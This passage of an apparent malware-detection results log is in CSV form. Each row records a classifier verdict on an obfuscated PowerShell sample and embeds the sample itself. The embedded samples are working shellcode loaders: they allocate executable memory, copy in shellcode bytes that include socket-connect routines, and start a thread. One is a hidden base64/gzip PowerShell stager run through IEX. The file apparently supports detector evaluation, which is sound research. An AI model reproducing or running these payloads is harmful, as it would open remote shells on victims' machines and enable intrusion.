dwCr','x0d,0xc0,0x50,0x81,0x3c,0x',',0xec,0x67,0x72,0x7c,0xe5,0x08,0xd7,0x4e,0x33,0x99,','0x46,0x2b,0x91,0x9d,0x93,0xfb,0x','e2,0xa8,0x9b,0xda,0x3f,0xe5,0x5c,0x73,0xe8,0x51,0xf4,0x2a,0x7e,0x73,0xfc,0xca,0x05',',0xa0,0x4f,0x07,0x37,0xb4,0x02,0x35,0xe5,0xe5,0xf0,0xe9,','x66,0x3a,0x7b,0xcc,0xf0,0x34,0xc9,0x6e,0x56,0x4b,0xe7,0x87,0xc7,0x4c,0xf7,0xa7,0x9','0xb9,0x03,0xf4,0x4c,0x3a,0xb9,0x08,0x64,0xd1,0x70,0xc8,0x25,0x76,0x19,0xca,0xb3,0x74,0x8d,0xa0,0x41,0x13,0x2f,0x63,0x2e,0x39,0xd9,0x51,0xe1,0x42,0xf3,0xf6,0xcf,0x7c,0x9a,0x40,0x2b,0x7e,0x4a,0x74,0x60,0','gth -gt 0x1000){3gNg = 3gNz.Length};3gNQWjc=3gN','w::VirtualAlloc(0,',',0x03,0xa3,0','Type -','(5Ipkernel32.dll5Ip)]public static extern IntPtr CreateT',',0x89,0x28,0xc','7,0x64','0x56,0xef,0xcd,0xc3,0','e 5IpWin325Ip -n','72,0xc2,0x43')).rEpLAcE(([Char]111+[Char]87+[Char]113),[striNG][Char]39).rEpLAcE('3gN','$').rEpLAcE(([Char]53+[Char]73+[Char]112),[striNG][Char]34))",malicious,TP
2026-07-13 16:55:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2065.ps1,custom-ps-ml,UNKNOWN,c1099338-2fb4-4372-9892-700faa4d338d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2914,1504.4,"&amp; ( $EnV:coMSPEc[4,15,25]-JOin'')(((\""{29}{10}{42}{44}{17}{32}{20}{37}{6}{47}{0}{30}{7}{9}{25}{11}{16}{28}{26}{21}{36}{46}{13}{39}{22}{2}{8}{1}{24}{4}{5}{3}{14}{35}{41}{45}{12}{31}{23}{43}{19}{48}{33}{15}{40}{34}{18}{27}{38}\"" -f't(IntPtr dest, ','57','xeb,0xb0,0x62,0x39,0x79,','0x1a,0xcc,0x59,0xca,0x65,0xb9','0x48,0x24,0x0a,0x11,0xe3,0xa2,0x26,0xda,0x2d,0x34',',0x49,0xf1,0x8a,0xaa,0xb4,0xfa,0xea,0xe3,0x72,0xae,0xba,0x9b,0x53,0xcf,0x50,0x5c,0x5c,','st',');zyA;NPsw = Add-Type -memberDefinition NP','0x23,0xc4,0xca,0xd9,0x8f,0xf5,0x1f,0xbf,0x44,0xf9,0xd4,0xcb,0x03,0x1d,0xea,0x18,0x38,0x19,0x67,0x9f,0xef,0xa8,0x33,0x84,0x2b,0xf1,0xe0,0xa5,0x6a,0x5f,0x46,0xd9,0x6d,0x00,0x37,0x7f,0xe5,0xac,0x2c,0xf2,0xa4,0xb8,0x81,0x3f,0x','s4WZB -Name C6mWin32C6m -namespace Win32Functions -passthru;[Byte[]];[Byte[]]NPsz = 0xbf,0x30,0xbf,0xe8,0xd5,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x7d,0x0f,0x03,0','C6mkernel3','0x0c,0x33,0x08,0x74,0x46,0x11,0xa4,0xff,0x0a,0x82,0x3f,0x8d,0x82,','3','c,0xef,0xe3,0xd5,0x4d,0x43,0',',0x63,0x0f,0x0e,0xb8,0x63,0x0e','f1,0xf9,0x92,0x1c,0xf2,0x','0xa5,0x88,0x38,0xf5,0x88,0x09,0x10,0xc5,0x8b,0x89,0x6b,0x1a,0x6c,0xb0,0xa3,0x6f,0x6d,0xf5','i','a1,0x84,0xbe,0xfe,0xd5,0x15,0x2b,0x01,0x8c,0xca,0xfc,0x69,0x32,0x35,0xca,',',0x82,0x4c,0x95,0x39,0xee,0x5e,0x41,0xca,0xa5,0x3d,0xc7,0xd5,0x13,0x2b,0xe7,0x43,0x98','ThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(C6m','x95,0x31,0xd0,0xdb,0xe0,0x89,0x5b,0x97,','a,0xdc,0x5f,0xe8,0x62,0x1f,0xdd,0','0xbd,0xb6,0xcd,',',0x38,0x8e,','x7d,0x3f,0x5d,0x1d,0x29,0xd7,0x23,0xde,0xd2,0x27,0x44,0x56,0x37,0x16,0x44,','xde,0x82,0x3f,0xae,0','0x35,0xcd,0x10,0xca,0x0a,0x18,0x5c,0xb8,0x62,0x98;NPsg = 0x1000;if (NPsz.Length -gt 0x1000){NPsg = NPsz.Length};NPszPz9=NPsw::VirtualAlloc(0,0x1000,NPsg,0x40);for (NPsi=0;NPsi -le (NPsz.Length-1);NPsi++',',0','NPs4WZB = zyA[DllImport(','uint src, uint count','5,0xe8,0xeb,0x32,0x5e,0x82,0x03,0xeb,0x36,0x3a,','c extern IntPtr CreateThread(IntPtr lp','fb,0xa2,0xdb,0xf6,0xa3,0x5d,0x0e,0x8d,0x6a,0xc8,0x','x76,0xf2,0x91,0xb0,0x22,0x',',0x75,0x35,0x85,0x40,0xd9,0x16,0x1a,0x20,0x89,0xd6,0xca,0','0xe5,0x89,0xb8,0x6f,0x07,0xbb,0x6e,0xe4,0x5e,0x1b,0x90,0x','msvcrt.dllC6m)]public ',') {NPsw::memset([IntPtr](NPszPz9.ToInt32()+NPsi), NPsz[NPsi], 1)};NPsw::CreateThread(0,0,NPszPz9,0,0,0);for (;;){Start-sleep 60};','xca,0xda,0xbf,0x9d,0x0','f9,0xc4,0','xc8,0xc3,0xd8,0','2.dllC6m)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImp','0xdb,0x42,0x6d,0xa8,0xdb,0xc9','ort(C6mkernel32.dllC6m)]public stat','x','29,0xeb,0x12,0x8a,0x2e,0xd6,0xed,0x21,0x84,0xa','atic extern IntPtr memse',',0xfa,0xb0,0x')).REplAce(([CHAr]78+[CHAr]80+[CHAr]115),'$').REplAce(([CHAr]122+[CHAr]121+[CHAr]65),[striNg][CHAr]39).REplAce('C6m',[striNg][CHAr]34))",malicious,TP
2026-07-13 16:55:28,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2067.ps1,custom-ps-ml,UNKNOWN,6fe91bc0-4491-415d-9baa-3d0561ddb7c5,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2793,1503.51," (((\""{26}{27}{24}{31}{32}{10}{25}{40}{16}{38}{33}{8}{42}{15}{7}{12}{43}{37}{28}{14}{4}{19}{39}{36}{35}{22}{3}{6}{20}{1}{29}{0}{30}{45}{44}{5}{11}{21}{13}{46}{2}{9}{34}{41}{23}{17}{18}\"" -f '86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,','0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b','0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x','0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,','1,0xc0,0xa',',0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xac,0x','0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,',' lpThreadId);[DllImport(f6Mmsvcrt.dllf6M)]public static extern IntPtr mem','IntPtr lpTh','58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0','dre','10','set(IntPtr dest, uint src, uint count);ra9;971w = Add-Type -memberDefinition 971c -Name f6MWin32f6M -namespace Win32Functions -passthru;[Byte[]];[Byte[]]971z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x7','7,0x68,0x99,0xa5,0x74,0x61,0',',0xb7,0x4a,0x26,0x31,0xff,0x3','artAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr','tect);[DllImport(f6Mkernel32.dllf6M)]public static e',';for (971i=0;971i -le (971z.Length-1);971i++) {971w::memset([IntPt','r](971x.ToInt32()+971i), 971z[971i], 1)};971w::CreateThread(0,0,971x,0,0,0);for (;;){Start-sleep 60};','c,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52','0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,',',0x02,0x16,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x5','0x8b,',' (971z.Length -gt 0x1000){971g = 971z.Length};971x=971w::VirtualAlloc(0,0x1000,971g,0x40)',' VirtualAlloc(I','ss, uint dwSi','971c = ra9[DllImport(f6Mkernel32.dllf6M)]pub','lic static extern IntPtr','0f',',0x12,0xeb,0x','0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff','ntPtr ','lpAd','(','x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;971g = 0x100','0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,','0,0x78,0x85,0xc0,0x74,0x4a,0x01,','0x28,0x','xtern IntPtr CreateThread',',0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x4','ze, uint flAllocationType, uint flPro','0;if','readAttributes, uint dwStackSize, IntPtr lpSt','2,','0x50',',0xd5,0x50,0x50,0x50,0x50,0x40,','xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf'))-RePlAce  ([Char]114+[Char]97+[Char]57),[Char]39  -cReplaCe 'f6M',[Char]34  -RePlAce([Char]57+[Char]55+[Char]49),[Char]36)| . ((vARiaBLE '*mdr*').Name[3,11,2]-joIN'')",malicious,TP
2026-07-13 16:55:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2073.ps1,custom-ps-ml,UNKNOWN,e24de957-0729-45d1-989c-ca0cbe713a8e,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2926,1598.54," &amp;( $SHeLliD[1]+$ShELLid[13]+'x')( (((\""{20}{68}{34}{64}{69}{49}{39}{59}{22}{21}{7}{4}{32}{53}{57}{36}{0}{35}{40}{46}{23}{19}{24}{42}{5}{41}{33}{26}{14}{45}{62}{17}{55}{54}{18}{8}{63}{60}{38}{9}{13}{58}{15}{61}{48}{31}{28}{67}{47}{1}{25}{50}{56}{37}{65}{6}{29}{27}{44}{52}{3}{10}{66}{11}{30}{2}{43}{16}{12}{51}\"" -f 'oO -namespace Win32Functions -passthru;[Byte[]];[Byt','0xff,0xd5,0x85,0xc','(xdQz.Length-1);xdQi++) {xdQw::memset([IntPtr](xdQx.To','.Length -gt 0x1000){xdQg = xdQz','emset(IntPtr dest, uint s','0,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0','3,0x','dId);[DllImport(EoOmsvcrt.dllEoO)]public static extern IntPtr m','0,0x6b,0','0f,0xdf,0xe0,0x','.Length};xdQx=xdQw::Virtua','Qg,0x','32()+xdQi), xdQz[xdQi], 1)};xdQw::Create','ff,0',',0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x','x05,0x68,0xc0,0xa','t','x68','8','c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe','xdQc =','tPtr lpThrea','er, uint dwCreationFlags, In','0x31,0xc0,0xac,0x3c,0x61,0x7','2,0xf0,0x52,0x57,0x8b,0x','0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0',',0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b',',0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x0','56,0','e5,0xff,0xd5,0x93,0x53','40);for (xdQi=0;xdQi -le ','0x89,0xe6,0x6a,0x10,0x','rc, uint count);T0l;xdQw = Add-T','0x8b,0x01,0xd6,0x31,0xff','[DllImport(EoOkernel32.dllEoO)]public static extern Int','e[]]xdQz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,','n32E','0x40,0x68','x50,0x68,0xea,0x','ss, IntPtr lpParam','0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c','x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,','52,0x1','In','1,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3','00,0',',0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,','0xa5,0x74,0x61,',',0xbb,',' extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddre','x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,','Thread(0,0,xdQx,0,0,0);for (;;){Start-sleep 60};',';xdQg = 0x1000;if (xdQz','ype -memberDefinition xdQc -Name E',',0x',',0x29','0xff,0xd5,0x8b,0x36,0x6a,','oOWi','xd5,0x97,0x6a,0','et','xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0','8,0x19,0x7e,0x68,0x02,0x00,0x01','x00,0x29,0xc4,0x54,0x50,0','x00,0xff,0','Ptr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAl',',0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x5','lAlloc(0,0x1000,xd','x57,0x68,0x99,',' T0l','locationType, uint flProtect);[DllImport(EoOkernel32.dllEoO)]public static')) -rEPLACE  'xdQ',[CHAr]36 -rEPLACE 'T0l',[CHAr]39  -cREplAcE([CHAr]69+[CHAr]111+[CHAr]79),[CHAr]34))",malicious,TP
2026-07-13 16:55:38,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2074.ps1,custom-ps-ml,UNKNOWN,ab615725-0eaf-40eb-9d01-ee28175259b0,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2921,1496.5,"(((\""{14}{43}{2}{38}{36}{23}{47}{24}{32}{21}{60}{57}{16}{67}{31}{29}{10}{45}{62}{12}{4}{46}{56}{5}{64}{8}{41}{17}{19}{50}{39}{18}{48}{37}{58}{15}{30}{22}{20}{25}{33}{13}{1}{35}{59}{51}{55}{66}{44}{53}{61}{0}{54}{34}{27}{7}{3}{52}{42}{11}{9}{40}{65}{28}{68}{63}{6}{49}{26}\""-f'a,0x05,0x68,0x','xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,','tern IntPtr VirtualAlloc(IntPtr lpAddre','f,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,','x8b,0x72,0x28,',',0xcf,0x0d,0x01,0x','IntPtr](Xdyx.ToInt32()+Xdyi), Xd','0x56,0xf','0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0','0xc3,0x29,0xc6,0','Xdyc -Name ','a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,','52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0','8b,0x12,0','Xdyc = 1X2[DllImpo','x01,0x','.dllLrI)]public static extern','xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3','0xcf,0x0d,0x01,0xc7,0x',',0xe3,0x3c,0x49,0x8b','e0,','adId);[Dll','b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0x','CreateThread(IntPtr lpThreadAttributes, uint dwStack',' uint dwCreationFlags, IntPtr lpT','0x58,0x5f,0','eThread(0,0,Xdyx,0,0,0);for (;;){Start-sleep 60};','08,0x75,0xec,0x68,0xf0,0xb5,0xa2,','yw::VirtualAlloc(0,0x1000,Xdyg,0x40);','2;Xdyw = Add-Type -memberDefinition ','d3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8','(IntPtr dest, uint src, uint count);1X','hre','x5a,0x','9,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x','0x77,0x73,0x3',' uint dwSize, uint flAllocationType, uint flProtect);[DllImport(LrIkernel32.dllLrI)]public static extern IntPtr ','5,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58','ss,','34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,','x85,0xf6,0x75,0xec,0xc3;Xdyg ','xd0,0x8b,0x40,0x78,0x85,0','0x8b,0x36,0x6','rt(LrIkernel32.dllLrI)]public static ex','40,0','LrIWin32LrI -namespace W','0x0f,0xb7,0x4a,0x26,0x31,0xff,0x3','Size, IntPtr lpStartAddress, IntPtr lpParameter,','38,0xe0,0x7','yz[Xdyi], 1)};Xdyw::Creat',',0x',',0xff,0xd5,0xb8,0x90','0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,','x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0','5f,0x6f,0x5a,0x38,0x68,0x02,0x00,0x01,0xbb,0x8',',0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0','1,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1','t(LrImsvcrt',',0x24,0','2,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07','Impor','xff,0xd5,0x97,0x6','in32Functions -passthru;[Byte[]];[Byte[]]Xdyz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x','i++) {Xdyw::memset([','c7,0xe2,0xf0,','= 0x1000;if (Xdyz.Length -gt 0x1000){Xdyg = Xdyz.Length};Xdyx=Xd','x50,0x',' IntPtr memset','for (Xdyi=0;Xdyi -le (Xdyz.Length-1);Xdy'))  -crEPLAce  ([CHAR]76+[CHAR]114+[CHAR]73),[CHAR]34 -RepLaCe  '1X2',[CHAR]39-RepLaCe 'Xdy',[CHAR]36)|. ((VaRIABLe '*mdr*').NAME[3,11,2]-joIN'')",malicious,TP
2026-07-13 16:55:42,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2076.ps1,custom-ps-ml,UNKNOWN,c6775219-2ef1-4b09-be07-0234b53356d8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2906,1511.0,"((\""{43}{24}{7}{20}{45}{28}{48}{23}{13}{17}{31}{37}{39}{16}{47}{22}{12}{34}{3}{29}{35}{42}{5}{18}{15}{38}{21}{2}{14}{41}{44}{1}{46}{8}{11}{36}{9}{0}{25}{10}{33}{30}{32}{27}{4}{19}{6}{40}{26}\"" -f'8,0x4b,0xf5,0xd8,0xc3,0xdd,0x0a,0xf7,0x6e,0x','0xf9,0x49,0x40,0xe5,0xb1,0x02,0x4e,0xf2,0xb6,0x38,0x36,0x6c,0x49,0xc3,0x47,0xa4,0x8d,0x97,0x17,0xde,0x24,0x98,0xf3,0','6,0x50,0x19,0x84,0x23,0x16,0x45,0x88,0xb2,0xfb,0xfd,0xb4,0x3f,0xfa,0xd1,0x3d,0x7b,0xd9,0xf5,0x66,','x92,0x68,0x38,0x2e,0x18,0x22,0xac,0x36,0xfd,0xf2,0x','sq=Nmfw::Virt','x8f,0x48,0xe6,0x77,0x7b,0','le (Nmfz.Length-1);Nmfi++) {Nmfw::memset([IntPtr](NmfYsq.ToInt32()+Nmfi), Nmfz[Nmfi], 1)};Nmfw::Crea',' sta','x1e,0x3c,0x72,0xe','xfc,0xe7,0x8a,0x9b,0xf4,0x82,0x9',',0x36,0xff,0','2,0x20,0x96,0x1b,0x88,0xce,0x4f,0x73,0x24,0x76,0xca,0x0f,0xd5,0x77,0xc0,','2,0xe6,0x3f,0x7d,0xdb,0','Flags, IntPtr lpT','0xdf,0x40,0xaf,0xc2,0x8e,0x7d,0xaf,0xad,','f,0x67,0x77,0xf8,0x48,0x4f,0x68,0x8f,0xa0,0xac,0x15,0x88,0x76,0xcf,0xc1,0x1d,0x','6a,0xcc,0xf4,0x30,0xbf,0x2e,0x','hreadId);[DllImport(6nUmsvcrt.dll6nU)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);DVO;Nmfw = Add-Type -','x4b,0x2e,0x46,0x84,0xe0,0x0','ualAlloc(0,0x1000,Nmfg,0x40);for (Nmfi=0;Nmfi -','tic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect','x49,0x86,0x4','xb2,0x2f,0x0',' dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreation','Ukernel32.dll6nU)]public','e1,0x9e,0xfc,0x38,0xb6','sleep 60};','fg = 0x1000;if (Nmfz.Length -gt 0x1000){Nmfg = Nmfz.Length};NmfY','tatic extern IntPtr Cr','c',',0x48,0x8b,0x11,0x95,0x33,0xe3,0x5d,0x79,0xb4,0xf3,0x0b,0x13,0xb4,0x9b,0xeb,0x47,0xe7,0xbe,0xf3,0x5d,0x9b,0x13,0x66,0x5e,0xca,0xc0,0x21,0x36,0xf0,0x3f','memberDefinition Nmf7ge0 -Name 6nUWin326nU -namespace Win32Functions -passthru;[Byte[]];[Byte[]]Nmfz = 0xbb,0xc3,0x87,0x45,0x98,0xda,0xdf,0xd9,0x74,0x24,0x',',0x05,0x99,0x0b,0x6a,0x97,0xe5,0xdd,0x52,0xed,0x07,0xde;Nm','x1d,0xf0,0x98,0x00','x6c,0xed,0','f,0x17,0x50,0x89,0x89,','0x75,0xd5,0','f4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,','6d,0x77,0x81,0x86,0','0xc2,0x04,0x03,0x5a,0xcc,0x65,0xb0,0x64,0x3a,0xeb,0x3b,0x95,0xba,0x8c,0xb2,0x70,0x8b,0x8c,0xa1,0xf1,0xbb,0x3c,0xa1,0x54,0x37,0xb6,0xe7,0x4c,0xcc,0xba,0x2f,0x62,0x65,0x70,0x16,0x4d,0x76,0x29,0x','teThread(0,0,NmfYsq,0,0,0);for (;;){Start-','0x6f,0xd8,0xbb,0x43,0x7b,0x51,0xe6,0x0b,0x48,0x58','0xb7,0x52,0x5e,0xa2,0xf1,0x4c,0x83,0','Nmf7ge0 = DVO[DllImport(6n',',0x19,0xcb,0xc6,0xeb,0x6a,',');[DllImport(6nUkernel32.dll6nU)]public s','x1e,0xc9,0x4d,0x69,0x1a,0x5d,0xae,0xc6,0x25,0xf1,0x46,0x15,0x26,0x08,0x2a,0x90,0xc0,0x5a,0x04,0xf3,0x5c,0x1a,0xf4,0xb3,0x0c,0xf2,0','c5,0xfa,0','eateThread(IntPtr lpThreadAttributes, uint')).replace(([CHaR]78+[CHaR]109+[CHaR]102),'$').replace('6nU',[StRIng][CHaR]34).replace(([CHaR]68+[CHaR]86+[CHaR]79),[StRIng][CHaR]39) | .( $SHEllId[1]+$ShellID[13]+'X')",malicious,TP
2026-07-13 16:55:47,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2080.ps1,custom-ps-ml,UNKNOWN,ed03aeb2-33ab-40af-95e9-eb74b1836e26,DESKTOP-BAC9DBQ,malicious,0.9989,RandomForest,2885,1513.64,".( $psHOmE[21]+$pSHOme[30]+'x') ( (((\""{27}{42}{7}{43}{40}{22}{3}{26}{12}{31}{34}{33}{32}{25}{4}{21}{19}{0}{2}{15}{17}{20}{35}{37}{29}{46}{11}{5}{9}{10}{14}{1}{23}{41}{6}{13}{47}{16}{24}{39}{8}{44}{38}{30}{18}{36}{28}{45}\""-f 'fuFOzSUOU2iytvkwh+zTmDe','YOabeq','DQgx','Qik4be20WFi+x1wTo9b/fGOyEKmmV64ezQN7dmdmdfeaZGXtx4AjKA8kzzeDe2BTPDVP6/v7dSQ+HeCkpuaBeO3vYdfXWMC/l1sGAj7w+KqknJ6CTC8nVRVf6K','WXnh6FUoXnp3ACDD/ev3v/zsvosG6dr3mpaAej6JgOMDq','pSHtIQgFwmCFf6jginyuWCAEs5YN2Ta','N6PjV','8powershell.exe5','iMcRUgIEFlYmRQ6f8','sInnEzYB1HX9ASeqSlZgf+A3rW5Ma527qaN7TQ2Mw81IyanUbP6DcalfWVZVeEVWuKVq8pOrXRfG6hxs1gLO6aqHFLi4txZb','e6o','8zLh+IHYCR4bDkYcQY4txkZdsGgooEAm0T3T6Qy+OCsTBn2pI0qAoWeZM9K1IiJ5bLq35iITNhKE','L1bZV7MyIdIoC','sjPzQMf4iPSPXR6V8ULnSAcd8+4B/BqvzB','jurjdzxRvu803ePRX2zm/uuNzY8zz/3rJvSJ5O2h9W+XizjtlGL20P9US9Wohp9bPTpoL+4MsX92GZ44Gn+qHSB6aYdzu0S7+yaCNVnZ87uyrPrs467HTe0i2FlgWoIV','jbAS+pktFJeCwDxGNnfuJCpdcE1RU4FxDUIIz4WCaJ5afLSrLak4slW','JHNuiOM2ndbU9NK414FNYp0WPdRsiX29T5G0drYGVrJdrk7/NQde5o9YueaUb1dOZ6maY8No+XclTZfrs+/tIfUXnI00DT7Q0IOYEduRsZe+Sjgv6rrHRxGM8yACFCvs2Q0eWimZbfHaWKhKMfdeEHCgDDoX9DhMlYjxriTdILjOg3N6N','jylzSYgcCGIEXkF81Z+','c8));IEX (New-Object IO.StreamReader(New-Object IO.C','EPFZ6PKJ79a9SMS914GgseLiFae42jIk6lSZJKCbTqZRbdFrdOP/rDUqZNuiyWbk2b9Q2HNYnNq','dOQRJ','Z7Mc','xEF4CcTA','8NdZD1NNs7Nv8seVXcdmvIt10KLnrD0y93zd1NKjPH4wLzQfbEZ7pQ7tM71ajmxnMTXChpRUrTZ','AippCfAxielV8dqdKTovrcJ7Kly8s78BkyJSNyoU0CX8zyxc1ZsQhlvripFOHib79rla+2ytN2+aRVHBA7PoTtD1GTVMqtvYq/7XXvd9f/C6ZpNs/g5b4R0+e130jfhHMxn2','IBck5CuLhGvqkKjQwIHLyA3xpkqXPGa3fquRcmwEWj0RqnmIymt+drgbM3Iwld','ikTtFoZfIlpML28rMZhSAJxmBfqRKAoIst7RkmkqNI/0nBGQnJ6fT8njpC+S7m/C3XG7zF','if([IntPt','sion.GzipStream(aq8s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();5c8;aq8s.UseShellExecute=aq8false;aq8s.RedirectStandardOutput=aq8true;aq8s.WindowStyle=5c8Hi','mxM1LKIhoKkKx4Puh/OxuJ2aCOjgS2XZT9QnI9MAqDyIRxg6EDy5/a62IQzFLsMhLD','CgAA5c85','N5G1uYMTDwvWilGhyN++ye','El6/E0cCLok','cNSQTqhWaw5gsCuMSM5aW/l','rktDQt1B5izCJFtraRIMuCy5isSj/U5MDb7Yoococ6IY+4JwpDGpyVC4Mgwh7pwm5r0iFixt1IVuEa8AuJiMNAOlwo2eEgV2QY9kLuIN','kZtBhywBqsNchmB4QGaSa','ompres','acE3manJ3NQkqsMR1Fe6sWQTU5esgh','p5DB3zx0if56LuOxWkXvkT+BTEfe9Zx','LxYv3nhf+E+J8','rocessStartInfo;aq8s.FileName=aq8b;aq8s.Arguments=5c8-nop -w hidden -c aq8s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(5c85c8H4sIAFvQZ1gCA71WbW/aSBD+nEr9D1aFZFslGAhtmkiVbo0','fs+LgPINU5wv4','r]::Size -eq 4){aq8b=5c','c8}else{aq8b=aq8env:windir+5c8iwGsyswow64iwGWindowsPowerShelliwGv1.0iwGpowershell.exe5c8};aq8s=New-Object 